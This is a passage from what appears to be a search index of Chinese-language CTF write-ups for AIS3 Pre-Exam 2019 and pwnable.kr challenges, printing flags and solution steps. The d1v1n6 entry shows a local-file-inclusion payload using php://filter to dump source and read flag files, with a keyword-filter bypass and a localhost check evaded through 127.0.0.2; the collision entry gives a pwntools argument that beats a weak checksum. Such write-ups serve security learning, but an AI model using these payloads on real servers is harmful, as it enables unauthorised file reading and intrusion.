\u767c\u8ca1.\u767c\u8ca1. b -> \u767c\u8ca1.\u767c\u8ca1.. c -> \u767c\u8ca1.\u767c\u8ca1... d -> \u767c\u8ca1.\u767c\u8ca1.... e -> \u767c\u8ca1.\u767c\u8ca1..... f -> \u767c\u8ca1.\u767c\u8ca1...... g -> \u767c\u8ca1.\u767c\u8ca1....... h -> \u767c\u8ca1.\u767c\u8ca1........ i -> \u767c\u8ca1..\u767c\u8ca1. j -> \u767c\u8ca1..\u767c\u8ca1.. ... \u628a flag.txt \u62ff\u4f86\u89e3\u78bc\u5c31\u80fd\u5f97\u5230flag","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Reverse/TsaiBro/#flag","text":"AIS3{y0u_4re_a_b1g_f4n_0f_tsaibro_n0w} \u4e26\u6c92\u6709","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Web/Hidden/","text":"Hidden Question FIND THE FLAG Write-up \u6aa2\u67e5\u539f\u59cb\u78bc\uff0c\u770b\u5230\u6709\u4e00\u500b main.019417bd.js 1 <!DOCTYPE html> < html >< title > Hidden </ title >< meta charset = \"utf-8\" ></ html >< body >< div id = \"app\" ></ div >< script src = \"/main.019417bd.js\" ></ script ></ body > \u9ede\u9032\u53bb\u767c\u73fe\u88ab\u6df7\u6dc6\u904e\uff0c\u770b\u5f97\u982d\u5f88\u75dbQQ \u5b8c\u5168\u4e0d\u77e5\u9053\u5b83\u5728\u505a\u4ec0\u9ebc\uff0c\u4e0d\u904e\u5176\u4e2d\u4e00\u6bb5\u5f88\u6709flag\u7684\u611f\u89ba\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var r = function () { return function () { var r = Array . prototype . slice . call ( arguments ), t = r . shift (); return r . reverse (). map ( function ( r , e ) { return String . fromCharCode ( r - t - 25 - e ) }). join ( \"\" ) }( 12 , 144 , 165 , 95 , 167 , 140 , 95 , 157 , 94 , 164 , 91 , 122 , 111 , 102 ) + 4. . toString ( 36 ). toLowerCase () + 21. . toString ( 36 ). toLowerCase (). split ( \"\" ). map ( function ( r ) { return String . fromCharCode ( r . charCodeAt () + - 13 ) }). join ( \"\" ) + 1234274547001. . toString ( 36 ). toLowerCase () + 21. . toString ( 36 ). toLowerCase (). split ( \"\" ). map ( function ( r ) { return String . fromCharCode ( r . charCodeAt () + - 13 ) }). join ( \"\" ) + 579. . toString ( 36 ). toLowerCase () + function () { var r = Array . prototype . slice . call ( arguments ), t = r . shift (); return r . reverse (). map ( function ( r , e ) { return String . fromCharCode ( r - t - 44 - e ) }). join ( \"\" ) }( 18 , 190 , 127 , 170 , 113 ) }; \u76f4\u63a5\u8cbc\u5230console\u4e2d\uff0c\u7136\u5f8c\u57f7\u884c r() \uff0c\u9084\u771f\u7684\u662fflag\uff08\u6688 Flag AIS3{4r3_y0u_4_fr0n73nd_g33k?}","title":"Hidden"},{"location":"CTF/AIS3PreExam2019/Web/Hidden/#hidden","text":"","title":"Hidden"},{"location":"CTF/AIS3PreExam2019/Web/Hidden/#question","text":"FIND THE FLAG","title":"Question"},{"location":"CTF/AIS3PreExam2019/Web/Hidden/#write-up","text":"\u6aa2\u67e5\u539f\u59cb\u78bc\uff0c\u770b\u5230\u6709\u4e00\u500b main.019417bd.js 1 <!DOCTYPE html> < html >< title > Hidden </ title >< meta charset = \"utf-8\" ></ html >< body >< div id = \"app\" ></ div >< script src = \"/main.019417bd.js\" ></ script ></ body > \u9ede\u9032\u53bb\u767c\u73fe\u88ab\u6df7\u6dc6\u904e\uff0c\u770b\u5f97\u982d\u5f88\u75dbQQ \u5b8c\u5168\u4e0d\u77e5\u9053\u5b83\u5728\u505a\u4ec0\u9ebc\uff0c\u4e0d\u904e\u5176\u4e2d\u4e00\u6bb5\u5f88\u6709flag\u7684\u611f\u89ba\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var r = function () { return function () { var r = Array . prototype . slice . call ( arguments ), t = r . shift (); return r . reverse (). map ( function ( r , e ) { return String . fromCharCode ( r - t - 25 - e ) }). join ( \"\" ) }( 12 , 144 , 165 , 95 , 167 , 140 , 95 , 157 , 94 , 164 , 91 , 122 , 111 , 102 ) + 4. . toString ( 36 ). toLowerCase () + 21. . toString ( 36 ). toLowerCase (). split ( \"\" ). map ( function ( r ) { return String . fromCharCode ( r . charCodeAt () + - 13 ) }). join ( \"\" ) + 1234274547001. . toString ( 36 ). toLowerCase () + 21. . toString ( 36 ). toLowerCase (). split ( \"\" ). map ( function ( r ) { return String . fromCharCode ( r . charCodeAt () + - 13 ) }). join ( \"\" ) + 579. . toString ( 36 ). toLowerCase () + function () { var r = Array . prototype . slice . call ( arguments ), t = r . shift (); return r . reverse (). map ( function ( r , e ) { return String . fromCharCode ( r - t - 44 - e ) }). join ( \"\" ) }( 18 , 190 , 127 , 170 , 113 ) }; \u76f4\u63a5\u8cbc\u5230console\u4e2d\uff0c\u7136\u5f8c\u57f7\u884c r() \uff0c\u9084\u771f\u7684\u662fflag\uff08\u6688","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Web/Hidden/#flag","text":"AIS3{4r3_y0u_4_fr0n73nd_g33k?}","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Web/SimpleWindow/","text":"SimpleWindow Question \u9019\u984c\u9023\u6211\u963f\u5b37\u90fd\u6703\u89e3 https://simple-window.ais3.kaibro.tw:10100/ Write-up \u9ede\u9032\u7db2\u5740\u5f8c\u770b\u5230\u4e00\u500b\u5f88\u6f6e\u7684terminal\u9801\u9762\uff0c\u6709\u500b flag \u9023\u7d50\u53ef\u4ee5\u9ede\u9032\u53bb\uff0c\u7db2\u5740\u662f\uff1a https://simple-window.ais3.kaibro.tw:10100/flag \u6703\u770b\u5230\u63d0\u793a Flag is here! But I catch it! \uff0c\u8003\u8a66\u6642\u770b\u4e0d\u61c2\u9019\u662f\u4ec0\u9ebc\uff0c\u7d22\u6027\u5728\u7db2\u5740\u5f8c\u9762\u63a5\u500b\u53c3\u6578\uff1a https://simple-window.ais3.kaibro.tw:10100/flag?a=1 \u5c31\u770b\u5230flag\u4e86\uff5e\uff5e\uff5e Flag AIS3{D0_y0u_kn0w_Serv1ce_W0rker?}","title":"SimpleWindow"},{"location":"CTF/AIS3PreExam2019/Web/SimpleWindow/#simplewindow","text":"","title":"SimpleWindow"},{"location":"CTF/AIS3PreExam2019/Web/SimpleWindow/#question","text":"\u9019\u984c\u9023\u6211\u963f\u5b37\u90fd\u6703\u89e3 https://simple-window.ais3.kaibro.tw:10100/","title":"Question"},{"location":"CTF/AIS3PreExam2019/Web/SimpleWindow/#write-up","text":"\u9ede\u9032\u7db2\u5740\u5f8c\u770b\u5230\u4e00\u500b\u5f88\u6f6e\u7684terminal\u9801\u9762\uff0c\u6709\u500b flag \u9023\u7d50\u53ef\u4ee5\u9ede\u9032\u53bb\uff0c\u7db2\u5740\u662f\uff1a https://simple-window.ais3.kaibro.tw:10100/flag \u6703\u770b\u5230\u63d0\u793a Flag is here! But I catch it! \uff0c\u8003\u8a66\u6642\u770b\u4e0d\u61c2\u9019\u662f\u4ec0\u9ebc\uff0c\u7d22\u6027\u5728\u7db2\u5740\u5f8c\u9762\u63a5\u500b\u53c3\u6578\uff1a https://simple-window.ais3.kaibro.tw:10100/flag?a=1 \u5c31\u770b\u5230flag\u4e86\uff5e\uff5e\uff5e","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Web/SimpleWindow/#flag","text":"AIS3{D0_y0u_kn0w_Serv1ce_W0rker?}","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Web/d1v1n6/","text":"d1v1n6 Question GOGOGO http://pre-exam-web.ais3.org:10103 Write-up \u6709\u500b hint \u9023\u7d50 http://pre-exam-web.ais3.org:10103/?path=hint.txt \uff0c\u88e1\u9762\u53ea\u6709 \u767c\u8ca1 \u5169\u500b\u5b57 \u61c9\u8a72\u662f LFI \u6f0f\u6d1e\uff0c\u4f7f\u7528PHP\u507d\u5354\u8b70\u628a index.php dump\u51fa\u4f86\uff1a 1 http://pre-exam-web.ais3.org:10103/index.php?path=php://filter/convert.base64-encode/resource=index.php \u5f97\u5230\u4e00\u500bbase64 encode\u904e\u7684\u5b57\u4e32\uff1a 1 PD9waHAKCiAgICBpZiAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT0gJzEyNy4wLjAuMScpIHsKCiAgICAgICAgLy8gc2hvdyBwYXRoIG9mIHRoZSBmbGFnCiAgICAgICAgZGllKCRfRU5WWydGTEFHX0hJTlQnXSk7CiAgICB9CgoKICAgIGlmICgkcGF0aCA9IEAkX0dFVFsncGF0aCddKSB7CiAgICAgICAgJHBhdGggPSB0cmltKCRwYXRoKTsKCiAgICAgICAgaWYgKHByZWdfbWF0Y2goJy9odHRwcz86XC9cLyhbXnNcL10rKS9pJywgJHBhdGgsICRnKSkgewogICAgICAgICAgICAvLyByZXNvbHZlIGlwIGFkZHJlc3MKICAgICAgICAgICAgJGlwID0gZ2V0aG9zdGJ5bmFtZSgkZ1sxXSk7CgogICAgICAgICAgICAvLyBubyBsb2NhbCByZXF1ZXN0CiAgICAgICAgICAgIGlmICgkaXAgPT0gJzEyNy4wLjAuMScgfHwgJGlwID09ICcwLjAuMC4wJykKICAgICAgICAgICAgICAgIGRpZSgnRG8gbm90IHJlcXVlc3QgdG8gbG9jYWxob3N0IScpOwogICAgICAgIH0KCiAgICAgICAgLy8gbm8gZmxhZyBpbiBwYXRoCiAgICAgICAgJHBhdGggPSBwcmVnX3JlcGxhY2UoJy9mbGFnL2knLCAnJywgJHBhdGgpOwoKICAgICAgICBpZiAoJGNvbnRlbnQgPSBAZmlsZV9nZXRfY29udGVudHMoJHBhdGgsIEZBTFNFLCBOVUxMLCAwLCAxMDAwKSkgewoKICAgICAgICAgICAgLy8gbm8gZmxhZyBpbiBjb250ZW50CiAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvZmxhZy9pJywgJGNvbnRlbnQpKSB7CiAgICAgICAgICAgICAgICBkaWUoJ0Rl decode \u4e4b\u5f8c\u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 <?php if ( $_SERVER [ 'REMOTE_ADDR' ] == '127.0.0.1' ) { // show path of the flag die ( $_ENV [ 'FLAG_HINT' ]); } if ( $path = @ $_GET [ 'path' ]) { $path = trim ( $path ); if ( preg_match ( '/https?:\\/\\/([^s\\/]+)/i' , $path , $g )) { // resolve ip address $ip = gethostbyname ( $g [ 1 ]); // no local request if ( $ip == '127.0.0.1' || $ip == '0.0.0.0' ) die ( 'Do not request to localhost!' ); } // no flag in path $path = preg_replace ( '/flag/i' , '' , $path ); if ( $content = @ file_get_contents ( $path , FALSE , NULL , 0 , 1000 )) { // no flag in content if ( preg_match ( '/flag/i' , $content )) { die ( ' De \u770b\u4f86\u7528127.0.0.1\u9023\u4e0a\u53bb\u53ef\u4ee5\u5f97\u5230flag\u7684\u63d0\u793a\uff0c\u4e00\u6a23\u7528php\u507d\u5354\u8b70\u628a\u63d0\u793a\u62ff\u51fa\u4f86\uff1a 1 http://pre-exam-web.ais3.org:10103/index.php?path=php://filter/read=convert.base64-encode/resource=http://127.0.0.2 \u4e0d\u77e5\u9053\u70ba\u4ec0\u9ebc127.0.0.1\u4e0d\u7d66\u904e\uff0c127.0.0.2\u5012\u662f\u53ef\u4ee5 \u4e00\u6a23\u5f97\u5230Base64\u7de8\u78bc\u7684\u5b57\u4e32\uff1a RkxBR18xNGQ2NTE4OTY2OWYwNWQyMDY3NjRjOWRlNDQxNDc0ZC50eHQ= \u89e3\u78bc\u4e4b\u5f8c\u5f97\u5230\u63d0\u793a\uff1a FLAG_14d65189669f05d206764c9de441474d.txt \u63a5\u4e0b\u4f86\u7684\u76ee\u6a19\u662f\u53d6\u5f97 FLAG_14d65189669f05d206764c9de441474d.txt \u7684\u5167\u5bb9\uff0c\u6709\u5169\u5c64\u95dc\u5361\uff1a \u7b2c\u4e00\u95dc 1 $ path = preg_replace ( '/flag/i' , '' , $ path ); ` \u9996\u5148 path \u5167\u5bb9\u4e2d\u7684\u6240\u6709 flag \u5b57\u4e32\u90fd\u6703\u88ab\u66ff\u63db\u6210 '' \uff0c\u53ea\u8981\u628a\u8def\u7d93\u4e2d\u7684 FLAG \u63db\u6210 FFLAGLAG \u5c31\u53ef\u4ee5\u4e86\u3002 \u7b2c\u4e8c\u95dc 1 2 if ( preg_match ( '/flag/i' , $ content )) { die ( 'D \u7d93\u904e\u7b2c\u4e00\u95dc\u4e4b\u5f8c\uff0c\u6709 flag \u7684\u5b57\u4e32\u7684\u8def\u5f91\u6703\u88ab\u64cb\u4e0b\u4f86\uff0c\u4e0a\u7db2\u67e5\u4e4b\u5f8c\u77e5\u9053php\u507d\u5354\u8b70\u53ef\u4ee5\u7e5e\u904e\u5b83\u3002 \u6240\u4ee5Payload\u5982\u4e0b\uff1a 1 http://pre-exam-web.ais3.org:10103/index.php?path=php://filter/read=convert.base64-encode/resource=FFLAGLAG_14d65189669f05d206764c9de441474d.txt \u4f9d\u7136\u5f97\u5230Base64\u7de8\u78bc\u7684\u5b57\u4e32\uff1a 1 ICAgICAgICAgICAgICAgICBeYC4gICAgICAgICAgICAgICAgICAgICBvCiBeXyAgICAgICAgICAgICAgXCAgXCAgICAgICAgICAgICAgICAgIG8gIG8KIFwgXCAgICAgICAgICAgICB7ICAgXCAgICAgICAgICAgICAgICAgbwogeyAgXCAgICAgICAgICAgLyAgICAgYH5+fi0tX18KIHsgICBcX19fLS0tLX5+JyAgICAgICAgICAgICAgYH5+LV8gICAgIF9fX19fXyAgICAgICAgICBfX19fXwogIFwgICAgICAgICAgICAgICAgICAgICAgICAgLy8vIGEgIGB+Ll8oX3x8X19fKV9fX19fX19fL19fXwogIC8gL35+fn4tLCAsX18uICAgICwgICAgICAvLy8gIF9fLCwsLCkgICAgICBvICBfX19fX18vICAgIFwKICBcLyAgICAgIFwvICAgIGB+fn47ICAgLC0tLX5+LV9gfj0gXCBcLS0tLS0tby0nICAgICAgICAgICAgXAogICAgICAgICAgICAgICAgICAgLyAgIC8gICAgICAgICAgICAvIC8KICAgICAgICAgICAgICAgICAgJy5fLicgICAgICAgICAgIF8vXy8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICc7fFwKWW91ciBmbGFnOgogIEFJUzN7NjAwZF9qMGJfYnU3XzdoMTVfMTVfbjA3XzdoM18zbmR9CgpIaW50cyBmb3IgZDF2MW42IGQzM3AzcjoKLSBGaW5kIHRoZSBvdGhlciB3ZWIgc2VydmVyIGluIHRoZSBpbnRlcm5hbCBuZXR3b3JrLgotIFNjYW5uaW5nIGlzIGZvcmJpZGRlbiBhbmQgbm90IG5lY2Vzc2FyeS4K \u89e3\u78bc\u4e4b\u5f8c\u5f97\u5230flag\u8ddf d1v1n6 d33p3r \u7684\u63d0\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ^`. o ^_ \\ \\ o o \\ \\ { \\ o { \\ / `~~~--__ { \\___----~~' `~~-_ ______ _____ \\ /// a `~._(_||___)________/___ / /~~~~-, ,__. , /// __,,,,) o ______/ \\ \\/ \\/ `~~~; ,---~~-_`~= \\ \\------o-' \\ / / / / '._.' _/_/ ';|\\ Your flag: AIS3{600d_j0b_bu7_7h15_15_n07_7h3_3nd} Hints for d1v1n6 d33p3r: - Find the other web server in the internal network. - Scanning is forbidden and not necessary. Flag AIS3{600d_j0b_bu7_7h15_15_n07_7h3_3nd}","title":"d1v1n6"},{"location":"CTF/AIS3PreExam2019/Web/d1v1n6/#d1v1n6","text":"","title":"d1v1n6"},{"location":"CTF/AIS3PreExam2019/Web/d1v1n6/#question","text":"GOGOGO http://pre-exam-web.ais3.org:10103","title":"Question"},{"location":"CTF/AIS3PreExam2019/Web/d1v1n6/#write-up","text":"\u6709\u500b hint \u9023\u7d50 http://pre-exam-web.ais3.org:10103/?path=hint.txt \uff0c\u88e1\u9762\u53ea\u6709 \u767c\u8ca1 \u5169\u500b\u5b57 \u61c9\u8a72\u662f LFI \u6f0f\u6d1e\uff0c\u4f7f\u7528PHP\u507d\u5354\u8b70\u628a index.php dump\u51fa\u4f86\uff1a 1 http://pre-exam-web.ais3.org:10103/index.php?path=php://filter/convert.base64-encode/resource=index.php \u5f97\u5230\u4e00\u500bbase64 encode\u904e\u7684\u5b57\u4e32\uff1a 1 PD9waHAKCiAgICBpZiAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT0gJzEyNy4wLjAuMScpIHsKCiAgICAgICAgLy8gc2hvdyBwYXRoIG9mIHRoZSBmbGFnCiAgICAgICAgZGllKCRfRU5WWydGTEFHX0hJTlQnXSk7CiAgICB9CgoKICAgIGlmICgkcGF0aCA9IEAkX0dFVFsncGF0aCddKSB7CiAgICAgICAgJHBhdGggPSB0cmltKCRwYXRoKTsKCiAgICAgICAgaWYgKHByZWdfbWF0Y2goJy9odHRwcz86XC9cLyhbXnNcL10rKS9pJywgJHBhdGgsICRnKSkgewogICAgICAgICAgICAvLyByZXNvbHZlIGlwIGFkZHJlc3MKICAgICAgICAgICAgJGlwID0gZ2V0aG9zdGJ5bmFtZSgkZ1sxXSk7CgogICAgICAgICAgICAvLyBubyBsb2NhbCByZXF1ZXN0CiAgICAgICAgICAgIGlmICgkaXAgPT0gJzEyNy4wLjAuMScgfHwgJGlwID09ICcwLjAuMC4wJykKICAgICAgICAgICAgICAgIGRpZSgnRG8gbm90IHJlcXVlc3QgdG8gbG9jYWxob3N0IScpOwogICAgICAgIH0KCiAgICAgICAgLy8gbm8gZmxhZyBpbiBwYXRoCiAgICAgICAgJHBhdGggPSBwcmVnX3JlcGxhY2UoJy9mbGFnL2knLCAnJywgJHBhdGgpOwoKICAgICAgICBpZiAoJGNvbnRlbnQgPSBAZmlsZV9nZXRfY29udGVudHMoJHBhdGgsIEZBTFNFLCBOVUxMLCAwLCAxMDAwKSkgewoKICAgICAgICAgICAgLy8gbm8gZmxhZyBpbiBjb250ZW50CiAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvZmxhZy9pJywgJGNvbnRlbnQpKSB7CiAgICAgICAgICAgICAgICBkaWUoJ0Rl decode \u4e4b\u5f8c\u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 <?php if ( $_SERVER [ 'REMOTE_ADDR' ] == '127.0.0.1' ) { // show path of the flag die ( $_ENV [ 'FLAG_HINT' ]); } if ( $path = @ $_GET [ 'path' ]) { $path = trim ( $path ); if ( preg_match ( '/https?:\\/\\/([^s\\/]+)/i' , $path , $g )) { // resolve ip address $ip = gethostbyname ( $g [ 1 ]); // no local request if ( $ip == '127.0.0.1' || $ip == '0.0.0.0' ) die ( 'Do not request to localhost!' ); } // no flag in path $path = preg_replace ( '/flag/i' , '' , $path ); if ( $content = @ file_get_contents ( $path , FALSE , NULL , 0 , 1000 )) { // no flag in content if ( preg_match ( '/flag/i' , $content )) { die ( ' De \u770b\u4f86\u7528127.0.0.1\u9023\u4e0a\u53bb\u53ef\u4ee5\u5f97\u5230flag\u7684\u63d0\u793a\uff0c\u4e00\u6a23\u7528php\u507d\u5354\u8b70\u628a\u63d0\u793a\u62ff\u51fa\u4f86\uff1a 1 http://pre-exam-web.ais3.org:10103/index.php?path=php://filter/read=convert.base64-encode/resource=http://127.0.0.2 \u4e0d\u77e5\u9053\u70ba\u4ec0\u9ebc127.0.0.1\u4e0d\u7d66\u904e\uff0c127.0.0.2\u5012\u662f\u53ef\u4ee5 \u4e00\u6a23\u5f97\u5230Base64\u7de8\u78bc\u7684\u5b57\u4e32\uff1a RkxBR18xNGQ2NTE4OTY2OWYwNWQyMDY3NjRjOWRlNDQxNDc0ZC50eHQ= \u89e3\u78bc\u4e4b\u5f8c\u5f97\u5230\u63d0\u793a\uff1a FLAG_14d65189669f05d206764c9de441474d.txt \u63a5\u4e0b\u4f86\u7684\u76ee\u6a19\u662f\u53d6\u5f97 FLAG_14d65189669f05d206764c9de441474d.txt \u7684\u5167\u5bb9\uff0c\u6709\u5169\u5c64\u95dc\u5361\uff1a \u7b2c\u4e00\u95dc 1 $ path = preg_replace ( '/flag/i' , '' , $ path ); ` \u9996\u5148 path \u5167\u5bb9\u4e2d\u7684\u6240\u6709 flag \u5b57\u4e32\u90fd\u6703\u88ab\u66ff\u63db\u6210 '' \uff0c\u53ea\u8981\u628a\u8def\u7d93\u4e2d\u7684 FLAG \u63db\u6210 FFLAGLAG \u5c31\u53ef\u4ee5\u4e86\u3002 \u7b2c\u4e8c\u95dc 1 2 if ( preg_match ( '/flag/i' , $ content )) { die ( 'D \u7d93\u904e\u7b2c\u4e00\u95dc\u4e4b\u5f8c\uff0c\u6709 flag \u7684\u5b57\u4e32\u7684\u8def\u5f91\u6703\u88ab\u64cb\u4e0b\u4f86\uff0c\u4e0a\u7db2\u67e5\u4e4b\u5f8c\u77e5\u9053php\u507d\u5354\u8b70\u53ef\u4ee5\u7e5e\u904e\u5b83\u3002 \u6240\u4ee5Payload\u5982\u4e0b\uff1a 1 http://pre-exam-web.ais3.org:10103/index.php?path=php://filter/read=convert.base64-encode/resource=FFLAGLAG_14d65189669f05d206764c9de441474d.txt \u4f9d\u7136\u5f97\u5230Base64\u7de8\u78bc\u7684\u5b57\u4e32\uff1a 1 ICAgICAgICAgICAgICAgICBeYC4gICAgICAgICAgICAgICAgICAgICBvCiBeXyAgICAgICAgICAgICAgXCAgXCAgICAgICAgICAgICAgICAgIG8gIG8KIFwgXCAgICAgICAgICAgICB7ICAgXCAgICAgICAgICAgICAgICAgbwogeyAgXCAgICAgICAgICAgLyAgICAgYH5+fi0tX18KIHsgICBcX19fLS0tLX5+JyAgICAgICAgICAgICAgYH5+LV8gICAgIF9fX19fXyAgICAgICAgICBfX19fXwogIFwgICAgICAgICAgICAgICAgICAgICAgICAgLy8vIGEgIGB+Ll8oX3x8X19fKV9fX19fX19fL19fXwogIC8gL35+fn4tLCAsX18uICAgICwgICAgICAvLy8gIF9fLCwsLCkgICAgICBvICBfX19fX18vICAgIFwKICBcLyAgICAgIFwvICAgIGB+fn47ICAgLC0tLX5+LV9gfj0gXCBcLS0tLS0tby0nICAgICAgICAgICAgXAogICAgICAgICAgICAgICAgICAgLyAgIC8gICAgICAgICAgICAvIC8KICAgICAgICAgICAgICAgICAgJy5fLicgICAgICAgICAgIF8vXy8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICc7fFwKWW91ciBmbGFnOgogIEFJUzN7NjAwZF9qMGJfYnU3XzdoMTVfMTVfbjA3XzdoM18zbmR9CgpIaW50cyBmb3IgZDF2MW42IGQzM3AzcjoKLSBGaW5kIHRoZSBvdGhlciB3ZWIgc2VydmVyIGluIHRoZSBpbnRlcm5hbCBuZXR3b3JrLgotIFNjYW5uaW5nIGlzIGZvcmJpZGRlbiBhbmQgbm90IG5lY2Vzc2FyeS4K \u89e3\u78bc\u4e4b\u5f8c\u5f97\u5230flag\u8ddf d1v1n6 d33p3r \u7684\u63d0\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ^`. o ^_ \\ \\ o o \\ \\ { \\ o { \\ / `~~~--__ { \\___----~~' `~~-_ ______ _____ \\ /// a `~._(_||___)________/___ / /~~~~-, ,__. , /// __,,,,) o ______/ \\ \\/ \\/ `~~~; ,---~~-_`~= \\ \\------o-' \\ / / / / '._.' _/_/ ';|\\ Your flag: AIS3{600d_j0b_bu7_7h15_15_n07_7h3_3nd} Hints for d1v1n6 d33p3r: - Find the other web server in the internal network. - Scanning is forbidden and not necessary.","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Web/d1v1n6/#flag","text":"AIS3{600d_j0b_bu7_7h15_15_n07_7h3_3nd}","title":"Flag"},{"location":"CTF/pwnable.kr/blackjack/","text":"blackjack Question Hey! check out this C implementation of blackjack game! I found it online * http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html I like to give my flags to millionares. how much money you got? Running at : nc pwnable.kr 9009 Write-up \u662f\u500b\u666e\u901a\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 int betting () // Asks user amount to bet { printf(\"\\n\\nEnter Bet : $ \"); scanf(\" % d \", &bet); if (bet > cash) //If player tries to bet more money than player has { printf(\" \\ nYou cannot bet more money than you have . \"); printf(\" \\ nEnter Bet : \"); scanf(\" % d \" , & bet ); return bet ; } else return bet ; } // End Function","title":"blackjack"},{"location":"CTF/pwnable.kr/blackjack/#blackjack","text":"","title":"blackjack"},{"location":"CTF/pwnable.kr/blackjack/#question","text":"Hey! check out this C implementation of blackjack game! I found it online * http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html I like to give my flags to millionares. how much money you got? Running at : nc pwnable.kr 9009","title":"Question"},{"location":"CTF/pwnable.kr/blackjack/#write-up","text":"\u662f\u500b\u666e\u901a\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 int betting () // Asks user amount to bet { printf(\"\\n\\nEnter Bet : $ \"); scanf(\" % d \", &bet); if (bet > cash) //If player tries to bet more money than player has { printf(\" \\ nYou cannot bet more money than you have . \"); printf(\" \\ nEnter Bet : \"); scanf(\" % d \" , & bet ); return bet ; } else return bet ; } // End Function","title":"Write-up"},{"location":"CTF/pwnable.kr/collision/","text":"collision Question Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) Write-up \u9023\u7dda\u4e0a\u53bb\u5f8c\u770b\u5230 vol.c\uff0c\u5167\u5bb9\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include <stdio.h> #include <string.h> unsigned long hashcode = 0x21DD09EC ; unsigned long check_password ( const char * p ){ int * ip = ( int * ) p ; int i ; int res = 0 ; for ( i = 0 ; i < 5 ; i ++ ){ res += ip [ i ]; } return res ; } int main ( int argc , char * argv []){ if ( argc < 2 ){ printf ( \"usage : %s [passcode] \\n \" , argv [ 0 ]); return 0 ; } if ( strlen ( argv [ 1 ]) != 20 ){ printf ( \"passcode length should be 20 bytes \\n \" ); return 0 ; } if ( hashcode == check_password ( argv [ 1 ] )){ system ( \"/bin/cat flag\" ); return 0 ; } else printf ( \"wrong passcode. \\n \" ); return 0 ; } \u53ef\u4ee5\u77e5\u9053\u53d6\u5f97 flag \u7684\u689d\u4ef6\u70ba\uff1a argv[1] \u7684\u5927\u5c0f\u70ba20byte \u6839\u64da check_password \uff0c argv[1] \u6bcf4byte\u4f5c\u70ba\u4e00\u500b int \u4e4b\u7e3d\u548c\u9700\u70ba 0x21DD09EC \u4e5f\u5c31\u662f\u5efa\u9020\u4e94\u500b int \u4e14\u7e3d\u548c\u70ba 0x21DD09EC \u5373\u53ef\u3002 \u6211\u5c07\u524d\u56db\u500b int \u8a2d\u70ba 0x01020304 \uff0c\u56e0\u6b64\u6700\u5f8c\u4e00\u500b int \u70ba 0x21DD09EC - 0x01020304 * 4 \u4f7f\u7528 pwntools \u5e6b\u5fd9\u5efa\u69cb\uff0c\u6307\u4ee4\u5982\u4e0b\uff1a 1 ./col ` python2 -c \"from pwn import *; print(p32(0x01020304) * 4 + p32(0x21DD09EC - 0x01020304 * 4))\" ` \u57f7\u884c\u5f8c\u5f97\u5230flag flag daddy! I just managed to create a hash collision :)","title":"collision"},{"location":"CTF/pwnable.kr/collision/#collision","text":"","title":"collision"},{"location":"CTF/pwnable.kr/collision/#question","text":"Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest)","title":"Question"},{"location":"CTF/pwnable.kr/collision/#write-up","text":"\u9023\u7dda\u4e0a\u53bb\u5f8c\u770b\u5230 vol.c\uff0c\u5167\u5bb9\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include <stdio.h> #include <string.h> unsigned long hashcode = 0x21DD09EC ; unsigned long check_password ( const char * p ){ int * ip = ( int * ) p ; int i ; int res = 0 ; for ( i = 0 ; i < 5 ; i ++ ){ res += ip [ i ]; } return res ; } int main ( int argc , char * argv []){ if ( argc < 2 ){ printf ( \"usage : %s [passcode] \\n \" , argv [ 0 ]); return 0 ; } if ( strlen ( argv [ 1 ]) != 20 ){ printf ( \"passcode length should be 20 bytes \\n \" ); return 0 ; } if ( hashcode == check_password ( argv [ 1 ] )){ system ( \"/bin/cat flag\" ); return 0 ; } else printf ( \"wrong passcode. \\n \" ); return 0 ; } \u53ef\u4ee5\u77e5\u9053\u53d6\u5f97 flag \u7684\u689d\u4ef6\u70ba\uff1a argv[1] \u7684\u5927\u5c0f\u70ba20byte \u6839\u64da check_password \uff0c argv[1] \u6bcf4byte\u4f5c\u70ba\u4e00\u500b int \u4e4b\u7e3d\u548c\u9700\u70ba 0x21DD09EC \u4e5f\u5c31\u662f\u5efa\u9020\u4e94\u500b int \u4e14\u7e3d\u548c\u70ba 0x21DD09EC \u5373\u53ef\u3002 \u6211\u5c07\u524d\u56db\u500b int \u8a2d\u70ba 0x01020304 \uff0c\u56e0\u6b64\u6700\u5f8c\u4e00\u500b int \u70ba 0x21DD09EC - 0x01020304 * 4 \u4f7f\u7528 pwntools \u5e6b\u5fd9\u5efa\u69cb\uff0c\u6307\u4ee4\u5982\u4e0b\uff1a 1 ./col ` python2 -c \"from pwn import *; print(p32(0x01020304) * 4 + p32(0x21DD09EC - 0x01020304 * 4))\" ` 